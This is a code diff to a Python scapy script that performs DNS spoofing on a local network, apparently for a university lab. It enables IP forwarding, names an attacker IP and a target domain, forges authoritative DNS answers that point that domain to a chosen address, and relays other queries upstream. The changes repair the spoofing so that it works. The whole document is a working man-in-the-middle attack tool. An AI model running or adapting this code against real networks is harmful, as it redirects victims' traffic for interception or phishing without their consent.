@@ -2,11 +2,14 @@ from scapy.all import *
 import socket
 import subprocess
 
+import os
+os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+
 attacker_ip = "192.168.0.254"
 upstream_dns = "192.168.0.1"
 upstream_port = 53
 spoof_domain = "xsite.singaporetech.edu"
-domain_ip = "192.168.x.x"
+domain_ip = "192.168.0.142"
 gateway_ip = "192.168.0.1"
 Ip_binding_table = {}
 Intface = "wlan0"  # Change to your network interface
@@ -14,7 +17,7 @@ target_mac = None
 target_ip = None
 
 '''Testing purposes'''
-Ip_binding_table["DC:97:BA:17:82:B6"] = "192.168.0.113"
+Ip_binding_table["DC:97:BA:17:82:B6"] = "192.168.0.116"
 
 def get_local_ip():
     try:
@@ -130,35 +133,47 @@ def dns_spoof(pkt):
         print(f"Checking for {str(spoof_domain)} against {str(qname)}")
         if str(spoof_domain) in str(qname):
             print(f"[!] Intercepted {spoof_domain}, sending custom response.")
-            ether = Ether(dst=target_mac, src=get_if_hwaddr(Intface))
-            ip_layer = IP(dst=target_ip, src=pkt[IP].dst)
+            ether = Ether(dst=pkt[Ether].src, src=get_if_hwaddr(Intface))
+            ip_layer = IP(dst=pkt[IP].src, src=pkt[IP].dst)
             udp_layer = UDP(dport=pkt[UDP].sport, sport=53)
             dns_layer = DNS(
                 id=pkt[DNS].id,
                 qr=1,
                 aa=1,
                 qd=pkt[DNS].qd,
-                an=DNSRR(rrname=pkt[DNSQR].qname, ttl=60, rdata=domain_ip)
+                an=DNSRR(rrname=pkt[DNSQR].qname.decode(), ttl=300, rdata=domain_ip)
             )
             response = ether / ip_layer / udp_layer / dns_layer
-            sendp(response, verbose=1)
+            #response.show2()
+            sendp(response, verbose=0)
         else:
             ''''''
             #Forward the packet to upstream and relay the response
             print(f"[+] Forwarding DNS query for {qname}")
-            raw_pkt = bytes(pkt[DNS])
+            raw_pkt = bytes(pkt[UDP].payload)
             try:
                 print(f"[+] Forwarding DNS query for {qname} to upstream DNS server. Original src: {pkt[IP].src}, dst: {pkt[IP].dst}")
                 # Forward the DNS query to the upstream DNS server
                 upstream_response = forward_to_upstream(raw_pkt)
-                ether = Ether(dst=target_mac, src=get_if_hwaddr(Intface))
-                ip_layer = IP(dst=target_ip, src=pkt[IP].dst)
+                parsed = DNS(upstream_response)
+                a_answers = []
+                for i in range(parsed.ancount):
+                    rr = parsed.an[i]
+                    if rr.type == 1:  # A record
+                        a_answers.append(rr)
+
+                if not a_answers:
+                    print("[!] No A records in upstream response. Dropping packet.")
+                    return
+                
+                ether = Ether(dst=pkt[Ether].src, src=get_if_hwaddr(Intface))
+                ip_layer = IP(dst=pkt[IP].src, src=pkt[IP].dst)
                 udp_layer = UDP(dport=pkt[UDP].sport, sport=53)
                 dns_resp = DNS(upstream_response)
                 response = ether / ip_layer / udp_layer / dns_resp
-                
+                #response.show2()
                 print(f"[+] Sending upstream DNS response to {pkt[IP].dst} from {pkt[IP].src}")
-                sendp(response, verbose=1)
+                sendp(response, verbose=0)
             except Exception as e:
                 print(f"[!] Error forwarding DNS: {e}")
 
